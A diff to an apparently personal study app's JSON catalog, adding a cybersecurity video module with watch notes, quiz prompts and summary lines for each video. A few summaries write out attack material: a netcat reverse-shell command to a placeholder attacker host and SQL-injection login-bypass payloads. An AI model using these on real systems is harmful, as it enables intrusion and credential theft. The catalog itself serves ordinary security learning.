@@ -56,6 +56,10 @@
   "world": [
    "How the World Works",
    "#f87171"
+  ],
+  "cyber": [
+   "Cyber & Security",
+   "#7c3aed"
   ]
  },
  "videos": [
@@ -1603,6 +1607,583 @@
    "thumb": "https://i.ytimg.com/vi/NdI6jMja3Bs/mqdefault.jpg",
    "src": "yt",
    "vertical": false
+  },
+  {
+   "id": "3QhU9jd03a0",
+   "module": "cyber",
+   "lang": "en",
+   "title": "Computer Networks: Crash Course Computer Science #28",
+   "channel": "CrashCourse",
+   "dur": 739,
+   "views": 1779055,
+   "tier": "drill",
+   "why": "The one video that makes the internet stop being magic. Layers, explained properly.",
+   "prompt": "In my own words, the layers of a network stack are...",
+   "thumb": "https://i.ytimg.com/vi/3QhU9jd03a0/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "Ethernet computers listen to a shared cable and only process data when their unique MAC address appears in the header.",
+    "When collisions occur, computers use exponential backoff—doubling their wait time after each repeated collision to reduce congestion.",
+    "Packet switching chops data into small packets that travel flexible routes, making the internet decentralized and fault-tolerant."
+   ]
+  },
+  {
+   "id": "mpQZVYPuDGU",
+   "module": "cyber",
+   "lang": "en",
+   "title": "How a DNS Server (Domain Name System) works.",
+   "channel": "PowerCert Animated Videos",
+   "dur": 364,
+   "views": 5711169,
+   "tier": "drill",
+   "why": "DNS is reconnaissance target #1 and the engine behind half of all phishing. Know it cold.",
+   "prompt": "In my own words, what a DNS server actually does is...",
+   "thumb": "https://i.ytimg.com/vi/mpQZVYPuDGU/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "DNS resolves human-readable domain names into IP addresses so browsers can reach web servers using numbers computers understand.",
+    "DNS resolution chains through local cache, ISP resolver, root server, TLD server, and finally the authoritative name server.",
+    "Once a resolver receives an IP address, it stores the result in cache memory to avoid repeating the full lookup chain for future queries."
+   ]
+  },
+  {
+   "id": "fSFeIdMZ_3I",
+   "module": "cyber",
+   "lang": "en",
+   "title": "TCP-3 Way Handshake Explained",
+   "channel": "HackerSploit",
+   "dur": 362,
+   "views": 52566,
+   "tier": "drill",
+   "why": "Every scan, every shell, every packet you will ever send rides on this handshake. Security-framed.",
+   "prompt": "In my own words, the three-way handshake works by...",
+   "thumb": "https://i.ytimg.com/vi/fSFeIdMZ_3I/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "The TCP three-way handshake starts with a client SYN, followed by a server SYN-ACK, and completed by a client ACK.",
+    "An nmap TCP connect scan completes the handshake to check open ports, then sends an RST to reset the connection.",
+    "UDP is connectionless with no handshake; an open port returns no response, while a closed port triggers an ICMP unreachable message."
+   ]
+  },
+  {
+   "id": "2BldESGZKB8",
+   "module": "cyber",
+   "lang": "en",
+   "title": "What is Hashing? Hash Functions Explained Simply",
+   "channel": "Lisk",
+   "dur": 156,
+   "views": 463804,
+   "tier": "drill",
+   "why": "Hashing vs encryption is the most confused pair in security. Two minutes, permanent.",
+   "prompt": "In my own words, the difference between hashing and encryption is...",
+   "thumb": "https://i.ytimg.com/vi/2BldESGZKB8/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "Hashing uses a mathematical function to convert input of any length into a fixed-size string of text.",
+    "No matter the input size, a hash produces a consistent-length array of numbers and letters.",
+    "The conversion from input text to hash output runs through a mathematical algorithm."
+   ]
+  },
+  {
+   "id": "GSIDS_lvRv4",
+   "module": "cyber",
+   "lang": "en",
+   "title": "Public Key Cryptography - Computerphile",
+   "channel": "Computerphile",
+   "dur": 380,
+   "views": 994640,
+   "tier": "drill",
+   "why": "Why you can shout your public key in a crowd and still keep a secret.",
+   "prompt": "In my own words, public key cryptography works because...",
+   "thumb": "https://i.ytimg.com/vi/GSIDS_lvRv4/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "In asymmetric encryption, anything encrypted with a public key can only be decrypted by the matching private key, and vice versa.",
+    "Encrypting with your private key proves authenticity: only you hold it, and anyone can verify the message with your public key.",
+    "You publish your public key widely and keep the private key secret, eliminating the need to exchange keys beforehand."
+   ]
+  },
+  {
+   "id": "hExRDVZHhig",
+   "module": "cyber",
+   "lang": "en",
+   "title": "SSL, TLS, HTTP, HTTPS Explained",
+   "channel": "PowerCert Animated Videos",
+   "dur": 391,
+   "views": 2823714,
+   "tier": "drill",
+   "why": "What the padlock actually proves - and what it does not prove.",
+   "prompt": "In my own words, the padlock in my browser proves... and does not prove...",
+   "thumb": "https://i.ytimg.com/vi/hExRDVZHhig/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "Standard HTTP transmits all data as clear text across the internet, making passwords and credit card numbers vulnerable to interception.",
+    "SSL uses public key encryption and certificates: the server sends its certificate, the browser verifies it, then encrypted data flows.",
+    "TLS is SSL's successor, based on the same specs, and both authenticate endpoints while encrypting transmitted data."
+   ]
+  },
+  {
+   "id": "kDEX1HXybrU",
+   "module": "cyber",
+   "lang": "en",
+   "title": "What is a Firewall?",
+   "channel": "PowerCert Animated Videos",
+   "dur": 385,
+   "views": 2465949,
+   "tier": "drill",
+   "why": "The 'filtered' port from my own scanme.nmap.org scan, explained.",
+   "prompt": "In my own words, a firewall decides what to do with a packet by...",
+   "thumb": "https://i.ytimg.com/vi/kDEX1HXybrU/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "A firewall filters incoming and outgoing network traffic using customizable rules called an access control list.",
+    "Host-based firewalls protect a single computer, while network-based firewalls protect entire networks at the network layer.",
+    "Firewall rules can filter by IP address, port number, domain name, protocol, program, or keyword."
+   ]
+  },
+  {
+   "id": "LnKoncbQBsM",
+   "module": "cyber",
+   "lang": "en",
+   "title": "Linux File Permissions in 5 Minutes | MUST Know!",
+   "channel": "Travis Media",
+   "dur": 363,
+   "views": 258055,
+   "tier": "drill",
+   "why": "My tracker line 12, on video. Watch AFTER doing the lab, not before.",
+   "prompt": "In my own words, chmod 754 means the owner can..., the group can..., others can...",
+   "thumb": "https://i.ytimg.com/vi/LnKoncbQBsM/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "Every Linux file and directory has three permission groups: owner, group, and others, each with read, write, and execute bits.",
+    "Use chown to change file ownership and chmod with octal notation where read equals 4, write equals 2, and execute equals 1.",
+    "A baseline file permission of 644 allows owner read-write and everyone else read-only; directories should use 755."
+   ]
+  },
+  {
+   "id": "4t4kBkMsDbQ",
+   "module": "cyber",
+   "lang": "en",
+   "title": "Nmap Tutorial to find Network Vulnerabilities",
+   "channel": "NetworkChuck",
+   "dur": 1028,
+   "views": 3587805,
+   "tier": "deep",
+   "why": "nmap walkthrough - the tool already installed on my Mac.",
+   "prompt": "In my own words, an open vs closed vs filtered port means...",
+   "thumb": "https://i.ytimg.com/vi/4t4kBkMsDbQ/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "Nmap scans entire networks to discover live hosts, open ports, running services, and OS versions in seconds.",
+    "The command nmap -sP network performs a ping sweep that identifies every active host across a subnet.",
+    "Nmap with -sV and -O flags reveals detailed service versions and operating system fingerprints for vulnerability research."
+   ]
+  },
+  {
+   "id": "B7tTQ272OHE",
+   "module": "cyber",
+   "lang": "en",
+   "title": "Simple Penetration Testing Tutorial for Beginners!",
+   "channel": "Loi Liang Yang",
+   "dur": 925,
+   "views": 984619,
+   "tier": "deep",
+   "why": "The recon -> enum -> exploit -> escalate -> report loop, demonstrated end to end.",
+   "prompt": "In my own words, the phases of a penetration test in order are...",
+   "thumb": "https://i.ytimg.com/vi/B7tTQ272OHE/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "Nmap with -sV and -O flags enumerates open ports, service versions, and the operating system of a target device.",
+    "Dirb brute-forces hidden web directories to reveal attack surfaces like /cgi-bin/ for further exploitation.",
+    "Metasploit delivers reverse shell payloads through vulnerable CGI-bin services, bypassing inbound firewall restrictions."
+   ]
+  },
+  {
+   "id": "bXCeFPNWjsM",
+   "module": "cyber",
+   "lang": "en",
+   "title": "how to get remote access to your hacking targets // reverse shells with netcat (Windows and Linux!!)",
+   "channel": "NetworkChuck",
+   "dur": 1207,
+   "views": 2831030,
+   "tier": "deep",
+   "why": "Why a reverse shell beats a bind shell. The payoff of every web bug I will find.",
+   "prompt": "In my own words, a reverse shell beats a bind shell because...",
+   "thumb": "https://i.ytimg.com/vi/bXCeFPNWjsM/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "start": 0,
+   "end": 1200,
+   "recallKeys": [
+    "A reverse shell bypasses firewalls by having the target connect outbound to the attacker instead of the attacker connecting inbound.",
+    "The attacker listens with nc -lvnp port; the target connects using nc -e /bin/bash attacker_ip port.",
+    "Netcat reverse shells work on both Linux and Windows; PowerShell provides a built-in shell delivery method on Windows."
+   ]
+  },
+  {
+   "id": "RFebj52xrLU",
+   "module": "cyber",
+   "lang": "en",
+   "title": "How Hackers Gain Root Access | Linux Privilege Escalation",
+   "channel": "pebble",
+   "dur": 594,
+   "views": 37413,
+   "tier": "drill",
+   "why": "User to root - the phase where CTF boxes are actually won.",
+   "prompt": "In my own words, the first three things I check for Linux privesc are...",
+   "thumb": "https://i.ytimg.com/vi/RFebj52xrLU/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "sudo -l reveals which commands a user can run as root; GTFO Bins lists one-liner exploits for vulnerable binaries like find.",
+    "SUID binaries execute with their owner's permissions regardless of who runs them, enabling privilege escalation to root.",
+    "Compromising writable cron jobs running as root lets you inject reverse shells or arbitrary commands for persistent escalation."
+   ]
+  },
+  {
+   "id": "2OPVViV-GQk",
+   "module": "cyber",
+   "lang": "en",
+   "title": "SQL Injections are scary!! (hacking tutorial for beginners)",
+   "channel": "NetworkChuck",
+   "dur": 614,
+   "views": 2086337,
+   "tier": "drill",
+   "why": "The classic. Module 6 target #1, demonstrated live.",
+   "prompt": "In my own words, SQL injection works by...",
+   "thumb": "https://i.ytimg.com/vi/2OPVViV-GQk/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "Inserting a single quote into a login field and receiving a SQL syntax error confirms the application is vulnerable to injection.",
+    "The payload ' OR '1'='1 exploits SQL operator precedence to bypass authentication by making the WHERE clause always true.",
+    "Using admin'-- as a username comments out the password check, granting access with only a known username and no password."
+   ]
+  },
+  {
+   "id": "EoaDgUgS6QA",
+   "module": "cyber",
+   "lang": "en",
+   "title": "Cross-Site Scripting (XSS) Explained",
+   "channel": "PwnFunction",
+   "dur": 687,
+   "views": 571487,
+   "tier": "drill",
+   "why": "PwnFunction's animated XSS is the clearest explanation on YouTube.",
+   "prompt": "In my own words, cross-site scripting attacks the user by...",
+   "thumb": "https://i.ytimg.com/vi/EoaDgUgS6QA/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "Cross-site scripting is a JavaScript injection technique that executes attacker-controlled code in a victim's browser context.",
+    "Reflected XSS echoes user input directly in the HTTP response as HTML, causing the browser to execute any injected script tags.",
+    "Stored XSS persists malicious payloads in a database so every user who views the affected page gets automatically exploited."
+   ]
+  },
+  {
+   "id": "Zyt7lUO3mY8",
+   "module": "cyber",
+   "lang": "en",
+   "title": "Server-Side Request Forgery (SSRF) Explained And Demonstrated",
+   "channel": "Loi Liang Yang",
+   "dur": 372,
+   "views": 118298,
+   "tier": "drill",
+   "why": "The bug that made cloud metadata endpoints famous.",
+   "prompt": "In my own words, SSRF makes the SERVER do... which is dangerous because...",
+   "thumb": "https://i.ytimg.com/vi/Zyt7lUO3mY8/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false
+  },
+  {
+   "id": "hIzeGCiRn1M",
+   "module": "cyber",
+   "lang": "en",
+   "title": "What is Broken Access Control? A Quick Guide for Beginners",
+   "channel": "The Cyber Mentors",
+   "dur": 723,
+   "views": 13246,
+   "tier": "drill",
+   "why": "OWASP 2025 A01 - the number one web risk, and the exact bug from my diagnostic Q10.",
+   "prompt": "In my own words, broken access control / IDOR is... and the fix is...",
+   "thumb": "https://i.ytimg.com/vi/hIzeGCiRn1M/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "Authentication verifies who you are; authorization and access control determine what actions and resources you are permitted.",
+    "Changing a user identifier in API requests exposes other users' private data when the server fails to verify ownership.",
+    "Directly browsing to admin URLs or switching user IDs in requests bypasses access controls to reveal privileged functionality."
+   ]
+  },
+  {
+   "id": "1S0aBV-Waeo",
+   "module": "cyber",
+   "lang": "en",
+   "title": "Running a Buffer Overflow Attack - Computerphile",
+   "channel": "Computerphile",
+   "dur": 1050,
+   "views": 2178298,
+   "tier": "deep",
+   "why": "Memory, the stack, and the founding bug of exploitation. Watch before Module 11.",
+   "prompt": "In my own words, a buffer overflow lets an attacker control... because...",
+   "thumb": "https://i.ytimg.com/vi/1S0aBV-Waeo/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "A function call pushes the return address onto the stack above local variables, so overflowing a buffer can redirect execution.",
+    "Functions like gets() accept unbounded input into fixed-size buffers with no length checks, enabling classic stack-based overflows.",
+    "Overwriting the saved return address to point at shellcode placed in the overflowed buffer grants arbitrary code execution."
+   ]
+  },
+  {
+   "id": "LOG-ewxwCOU",
+   "module": "cyber",
+   "lang": "hi",
+   "title": "Active directory in a nutshell | How windows AD works in networking (2025)",
+   "channel": "IT k Funde",
+   "dur": 925,
+   "views": 415123,
+   "tier": "deep",
+   "why": "The thing that runs every corporate network on earth. Module 8 starts here.",
+   "prompt": "In my own words, Active Directory exists to solve...",
+   "thumb": "https://i.ytimg.com/vi/LOG-ewxwCOU/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "Active Directory is a hierarchical database that centrally organizes and secures enterprise resources like users and servers.",
+    "AD's logical architecture has five building blocks: objects, domains, organizational units, trees, and forests in a namespace.",
+    "Domain controllers handle authentication requests while DNS resolves the nearest DC and the global catalog indexes forest-wide."
+   ]
+  },
+  {
+   "id": "kp5d8Yv3-0c",
+   "module": "cyber",
+   "lang": "en",
+   "title": "MicroNugget: How Kerberos Works in Windows Active Directory | CBT Nuggets",
+   "channel": "CBT Nuggets",
+   "dur": 428,
+   "views": 403107,
+   "tier": "drill",
+   "why": "Authentication for AD, and the source of half of red-team tradecraft.",
+   "prompt": "In my own words, Kerberos proves identity using tickets by...",
+   "thumb": "https://i.ytimg.com/vi/kp5d8Yv3-0c/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "Kerberos never transmits the password across the network; it uses the password as a shared encryption key for the Authenticator.",
+    "The KDC issues a Ticket Granting Ticket encrypted with its own key, valid for 8 hours, so the client isn't re-authenticated every access.",
+    "Service tickets are encrypted with the target server's password, letting the server decrypt them without ever communicating with the KDC."
+   ]
+  },
+  {
+   "id": "FDFxGLnZtoY",
+   "module": "cyber",
+   "lang": "en",
+   "title": "Zero-day Vulnerabilities - CompTIA Security+ SY0-701 - 2.3",
+   "channel": "Professor Messer",
+   "dur": 182,
+   "views": 174662,
+   "tier": "drill",
+   "why": "What the news actually means by 'zero-day'. Three minutes.",
+   "prompt": "In my own words, a zero-day is... and it is dangerous because...",
+   "thumb": "https://i.ytimg.com/vi/FDFxGLnZtoY/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "A zero-day attack exploits a vulnerability unknown to the vendor, so no patch exists when exploitation begins.",
+    "Attackers work constantly to discover undisclosed vulnerabilities first, since they do not share findings with the software vendor.",
+    "Real-world examples include Chrome sandbox escapes, Microsoft Secure Boot bypasses, and Apple iOS arbitrary code execution."
+   ]
+  },
+  {
+   "id": "oSyEGkX6sX0",
+   "module": "cyber",
+   "lang": "en",
+   "title": "CVE and CVSS explained | Security Detail",
+   "channel": "Red Hat",
+   "dur": 224,
+   "views": 39281,
+   "tier": "drill",
+   "why": "How vulnerabilities get named, tracked and scored.",
+   "prompt": "In my own words, CVE is... and CVSS measures...",
+   "thumb": "https://i.ytimg.com/vi/oSyEGkX6sX0/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "The CVE database assigns identifiers to publicly known software flaws, while CVSS scores them 0 to 10 by severity.",
+    "CVSS scores exploitability, scope, and impact but doesn't measure organizational risk — that requires evaluating likelihood and consequence.",
+    "Open source software may have more published CVEs, but that transparency lets users compensate with knowledge unlike proprietary software."
+   ]
+  },
+  {
+   "id": "gSXBa5RehYk",
+   "module": "cyber",
+   "lang": "en",
+   "title": "OSINT - Open Source Intelligence Overview",
+   "channel": "Covert Cabal",
+   "dur": 397,
+   "views": 435282,
+   "tier": "drill",
+   "why": "Passive recon - what I can learn about a target without touching it.",
+   "prompt": "In my own words, OSINT differs from active recon because...",
+   "thumb": "https://i.ytimg.com/vi/gSXBa5RehYk/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "OSINT collects and analyzes publicly available data — satellite imagery, social media, and street view — to produce intelligence.",
+    "Investigators geo-located the MH17 missile launcher by cross-referencing social media photos, dashcam footage, and Google Street View.",
+    "Free tools like Google Earth, Bing Maps, and WikiMapia let anyone verify intelligence claims without trusting governments blindly."
+   ]
+  },
+  {
+   "id": "jrHRe9lSqqA",
+   "module": "cyber",
+   "lang": "en",
+   "title": "What Is a Prompt Injection Attack?",
+   "channel": "IBM Technology",
+   "dur": 657,
+   "views": 298006,
+   "tier": "drill",
+   "why": "Module 12, done now. The bug class aimed at the systems I build.",
+   "prompt": "In my own words, a prompt injection attack works by... and the defence is...",
+   "thumb": "https://i.ytimg.com/vi/jrHRe9lSqqA/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "Prompt injection is a social-engineering-style attack on LLMs where user input overrides the system's original instructions.",
+    "Direct injection inserts a malicious prompt from an attacker; indirect injection poisons external data sources the model retrieves later.",
+    "Mitigations include input filtering, least-privilege access, human-in-the-loop approval for critical actions, and RLHF training."
+   ]
+  },
+  {
+   "id": "_IOZ8_cPgu8",
+   "module": "cyber",
+   "lang": "hi",
+   "title": "Networking Basics (2026) | What is a switch, router, gateway, subnet, gateway, firewall & DMZ",
+   "channel": "IT k Funde",
+   "dur": 898,
+   "views": 6240985,
+   "tier": "drill",
+   "why": "Switch, router, gateway, subnet - the Hindi explainer that makes the words click. Verified Devanagari captions.",
+   "prompt": "मेरे शब्दों में: switch, router और gateway में फर्क है...",
+   "thumb": "https://i.ytimg.com/vi/_IOZ8_cPgu8/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "A LAN connects nearby devices via a switch, each identified by a unique IP address used for local communication.",
+    "A router acts as the gateway between LAN and internet, performing NAT to translate private IPs so local devices stay hidden.",
+    "Port forwarding and DMZ are two mechanisms that selectively allow external traffic to reach specific internal network devices."
+   ]
+  },
+  {
+   "id": "rrw-Pv3rc0E",
+   "module": "cyber",
+   "lang": "hi",
+   "title": "What is LINUX for Beginners? Understand Linux Distributions & Kernel [HINDI] | MPrashant",
+   "channel": "M Prashant",
+   "dur": 545,
+   "views": 782034,
+   "tier": "drill",
+   "why": "Linux distributions and the kernel, in Hindi. Pairs with the English permissions video.",
+   "prompt": "मेरे शब्दों में: Linux कर्नेल और distribution में फर्क है...",
+   "thumb": "https://i.ytimg.com/vi/rrw-Pv3rc0E/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "Linux is not a complete OS but an open-source kernel, the core layer between hardware and software.",
+    "Different companies build their own Linux distributions (Ubuntu, Red Hat, Kali) by customizing the same kernel.",
+    "Linux skills are a must-have for IT roles like System Admin, DevOps Engineer, and Cloud Engineer."
+   ]
+  },
+  {
+   "id": "5yfbcQw0hLY",
+   "module": "cyber",
+   "lang": "hi",
+   "title": "Phishing Attack | Cybersecurity | Ethical Hacking",
+   "channel": "Gate Smashers",
+   "dur": 466,
+   "views": 102387,
+   "tier": "drill",
+   "why": "Phishing anatomy in Hindi - the attack that starts most breaches. Gate Smashers is exam-grade.",
+   "prompt": "मेरे शब्दों में: phishing attack काम करता है...",
+   "thumb": "https://i.ytimg.com/vi/5yfbcQw0hLY/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "Phishing uses fake emails, messages, websites, and calls mimicking legitimate sources to steal passwords and card details.",
+    "Attackers build trust by posing as bank officials, then extract OTPs and sensitive data to drain victim accounts.",
+    "Phishing affects everyone regardless of education or location, making awareness and proactive prevention essential."
+   ]
+  },
+  {
+   "id": "VBejkJSsHZ0",
+   "module": "cyber",
+   "lang": "hi",
+   "title": "What is Cyber Security With Full Information? – [Hindi] – Quick Support",
+   "channel": "Quick Support",
+   "dur": 653,
+   "views": 2048370,
+   "tier": "drill",
+   "why": "Plain-language Hindi intro to the whole field. Watch first if the English videos feel fast.",
+   "prompt": "मेरे शब्दों में: cyber security का मतलब है...",
+   "thumb": "https://i.ytimg.com/vi/VBejkJSsHZ0/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "Cyber security protects internet-connected systems including hardware, software, and data from unauthorized access and cyber crimes.",
+    "Common cyber attacks include viruses, trojans, ransomware, adware, and phishing emails that steal passwords and credit card data.",
+    "Every country has cyber security laws to curb hi-tech crimes, and users must know attack types to report them quickly."
+   ]
+  },
+  {
+   "id": "mH48U0PlLKI",
+   "module": "cyber",
+   "lang": "en",
+   "title": "What is Active Directory?",
+   "channel": "CBT Nuggets",
+   "dur": 546,
+   "views": 204641,
+   "tier": "drill",
+   "why": "Active Directory for the English path - IT k Funde's AD video turned out to be Hindi, so this is the English counterpart.",
+   "prompt": "In my own words, Active Directory is... and a domain controller does...",
+   "thumb": "https://i.ytimg.com/vi/mH48U0PlLKI/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "Active Directory is a searchable data store of user accounts, computer accounts with auto-refreshed passwords, and nestable groups.",
+    "Group Policy Objects centrally control thousands of settings that govern what users can see and do on their Windows machines.",
+    "Domain controllers replicate data as peers with near-instant sync within a site and issue Kerberos tickets for integrated authentication."
+   ]
+  },
+  {
+   "id": "Gk3_Q-3R6jc",
+   "module": "cyber",
+   "lang": "en",
+   "title": "Server-Side Request Forgery (SSRF) Explained",
+   "channel": "NahamSec",
+   "dur": 957,
+   "views": 56432,
+   "tier": "deep",
+   "why": "SSRF explained by NahamSec, a working bug-bounty hunter. Added because the Loi Liang Yang SSRF demo carries no caption track and so cannot be recall-keyed.",
+   "prompt": "In my own words, SSRF makes the server request... and the impact is...",
+   "thumb": "https://i.ytimg.com/vi/Gk3_Q-3R6jc/mqdefault.jpg",
+   "src": "yt",
+   "vertical": false,
+   "recallKeys": [
+    "In SSRF the vulnerable server makes the request for you, reaching internal APIs and back-end systems your browser cannot touch.",
+    "Before calling it SSRF, confirm the request is server-side: if the response shows YOUR public IP, your browser made it, not the server.",
+    "Real SSRF impact comes from file:// reads like /etc/passwd, hitting localhost or internal hosts, and pulling cloud metadata credentials."
+   ]
   }
  ],
  "reel_note": "Instagram embeds verified in-browser (video element rendered). Signed IG CDN thumbnail URLs expire, so reels render a text tile instead."
